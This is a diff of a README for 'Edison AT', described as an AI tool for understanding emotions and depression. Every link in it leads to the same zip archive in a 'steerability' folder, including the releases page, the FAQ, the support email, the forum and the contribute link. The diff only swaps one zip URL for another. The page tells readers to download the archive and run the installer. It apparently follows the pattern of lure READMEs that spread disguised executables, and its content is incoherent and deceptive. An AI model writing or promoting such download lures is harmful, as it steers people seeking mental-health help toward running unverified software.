@@ -1,7 +1,7 @@
 # 🤖 Edison-AT-AI-EmotionalDepression - Understand Your Emotions Easily
 
 ## 📥 Download Now
-[![Download Edison AT](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip%20Edison%20AT-v1.0-blue)](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip)
+[![Download Edison AT](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip%20Edison%20AT-v1.0-blue)](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip)
 
 ## 🚀 Getting Started
 Edison AT is an AI emotional depression program designed to help you understand your feelings better. It uses advanced technology to analyze your emotional state and provide insights. Follow these steps to download and run the software easily.
@@ -16,10 +16,10 @@ Before you download Edison AT, ensure your computer meets these requirements:
 - **Network:** Internet connection for features related to AI analysis
 
 ## 📂 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip) to find the latest version of Edison AT.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip) to find the latest version of Edison AT.
 2. **Select the Latest Release:** Look for the newest version, which will be prominently displayed at the top of the page. Click on it.
 3. **Download the Installer:**
-   - Click on the installer file suitable for your operating system. This file may be named like `https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip` for Windows or `https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip` for Mac.
+   - Click on the installer file suitable for your operating system. This file may be named like `https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip` for Windows or `https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip` for Mac.
 4. **Run the Installer:**
    - Once the download completes, locate the file in your downloads folder.
    - Double-click on the installer file to begin the installation.
@@ -47,17 +47,17 @@ Edison AT offers several features to help you manage your emotions effectively:
 To learn more about using Edison AT, check out these resources:
 
 - **User Guide:** A detailed guide available in the application under Help.
-- **FAQs:** Visit the [FAQs page](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip) for common questions and answers.
+- **FAQs:** Visit the [FAQs page](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip) for common questions and answers.
 - **Support Forum:** Join the support community at our forum to share tips and get advice from other users.
 
 ## 📞 Contact
 If you have any questions or need assistance, please contact our support team:
 
-- **Email:** https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip
-- **Forum:** Engage with others in the [Support Forum](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip).
+- **Email:** https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip
+- **Forum:** Engage with others in the [Support Forum](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip).
 
 ## 🔗 Additional Links
-- [Issues Page](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip) - Report bugs or request new features.
-- [Contribute](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip) - Want to help improve Edison AT? Learn how to contribute.
+- [Issues Page](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip) - Report bugs or request new features.
+- [Contribute](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip) - Want to help improve Edison AT? Learn how to contribute.
 
-Remember, understanding your emotions can lead to better mental health. Download Edison AT today from the [Releases page](https://raw.githubusercontent.com/ardabqb/Edison-AT-AI-EmotionalDepression/main/steerability/Edison-AT-AI-EmotionalDepression.zip) and begin your journey toward a happier you!
+Remember, understanding your emotions can lead to better mental health. Download Edison AT today from the [Releases page](https://github.com/ardabqb/Edison-AT-AI-EmotionalDepression/raw/refs/heads/main/steerability/Depression_A_Edison_Emotional_v2.4.zip) and begin your journey toward a happier you!
